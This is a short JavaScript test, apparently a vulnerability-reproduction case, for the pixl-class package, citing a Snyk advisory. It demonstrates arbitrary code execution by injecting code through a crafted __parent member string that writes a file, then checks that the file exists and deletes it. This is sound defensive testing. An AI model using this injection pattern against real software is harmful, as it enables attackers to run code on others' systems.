//https://security.snyk.io/vuln/SNYK-JS-PIXLCLASS-564968
test("Arbitrary code execution in pixl-class", () => {
  const fs = require("fs");
  const a = require("pixl-class");
  const path = "./pixl-class";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  var members = {
    __parent:
      'function(){}; require("fs").writeFileSync("./pixl-class",""); //}',
  };

  try {
    a.create(members);
  } catch (e) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
